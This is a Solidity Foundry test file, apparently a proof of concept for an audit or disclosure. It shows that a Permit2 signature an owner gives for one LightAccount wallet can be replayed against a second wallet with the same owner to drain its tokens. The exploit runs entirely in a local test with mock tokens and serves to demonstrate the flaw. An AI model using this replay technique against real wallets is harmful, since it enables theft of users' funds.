// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Permit2} from "lib/permit2/src/Permit2.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {IEntryPoint} from "lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
import {LightAccount} from "lib/light-account/src/LightAccount.sol";
import {LightAccountFactory} from "lib/light-account/src/LightAccountFactory.sol";
import {IAllowanceTransfer} from "lib/permit2/src/interfaces/IAllowanceTransfer.sol";


contract TestAlchemyPoc is Test {
    LightAccountFactory factory = new LightAccountFactory(IEntryPoint(address(0)));
    ERC20 erc20 = new ERC20("a", "a");
    Permit2 permit2 = new Permit2();
    LightAccount accountA;
    LightAccount accountB;

    address owner;
    uint256 privKey;
    address attacker = address(2);

    // sig, keep here to persist between tests
    IAllowanceTransfer.PermitSingle permitSingle;
    uint8 v;
    bytes32 r;
    bytes32 s;

    bytes32 _PERMIT_SINGLE_TYPEHASH = keccak256(
        "PermitSingle(PermitDetails details,address spender,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"
    );
    bytes32 _PERMIT_DETAILS_TYPEHASH =
        keccak256("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)");

    function setUp() public {
        (owner, privKey) = makeAddrAndKey("1");

        accountA = factory.createAccount(owner, 0);
        accountB = factory.createAccount(owner, 1);

        deal(address(erc20), address(accountA), 10 ether);
        deal(address(erc20), address(accountB), 10 ether);
    }

    // owner signs transfer from account A to attacker via permit2
    function test_permit() public {
        // permit single for permit2
        permitSingle = IAllowanceTransfer.PermitSingle({
            details: IAllowanceTransfer.PermitDetails({
                token: address(erc20),
                amount: uint160(10 ether),
                expiration: type(uint48).max,
                nonce: 0
            }),
            spender: attacker,
            sigDeadline: type(uint256).max
        });

        // hashing/preparing data blob for permit2
        bytes32 permitHash = keccak256(
            abi.encode(
                keccak256("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"),
                permitSingle.details
            )
        );
        bytes32 dataHash =
            keccak256(abi.encode(_PERMIT_SINGLE_TYPEHASH, permitHash, permitSingle.spender, permitSingle.sigDeadline));
        bytes32 hashedTypeData = keccak256(abi.encodePacked("\x19\x01", permit2.DOMAIN_SEPARATOR(), dataHash));

        // balances before attack
        assertEq(erc20.balanceOf(attacker), 0 ether);
        assertEq(erc20.balanceOf(address(accountA)), 10 ether);

        // sign
        (v, r, s) = vm.sign(privKey, hashedTypeData);
        console2.log("typed data: ");
        console2.logBytes32(hashedTypeData);

        // token receiver calls permit with sigs
        vm.startPrank(address(accountA));
        erc20.approve(address(permit2), uint160(10 ether));
        vm.startPrank(address(accountB));
        erc20.approve(address(permit2), uint160(10 ether));

        vm.startPrank(attacker);
        permit2.permit(address(accountA), permitSingle, abi.encodePacked(r, s, v));

        // transfer and check transfers
        permit2.transferFrom(address(accountA), attacker, uint160(10 ether), address(erc20));
        assertEq(erc20.balanceOf(attacker), 10 ether);
        assertEq(erc20.balanceOf(address(accountA)), 0 ether);
        console2.log("test 1 pass");
    }

    function test_permit_attack() public {
        // attacker receives legit transfer from owner's account A
        test_permit();

        // attacker replays sig to steal from owner's account B
        vm.startPrank(attacker);
        permit2.permit(address(accountB), permitSingle, abi.encodePacked(r, s, v));

        // check bal
        permit2.transferFrom(address(accountB), attacker, uint160(10 ether), address(erc20));
        assertEq(erc20.balanceOf(attacker), 20 ether);
        assertEq(erc20.balanceOf(address(accountA)), 0 ether);
        assertEq(erc20.balanceOf(address(accountB)), 0 ether);
        console2.log("test 2 pass");
    }
}
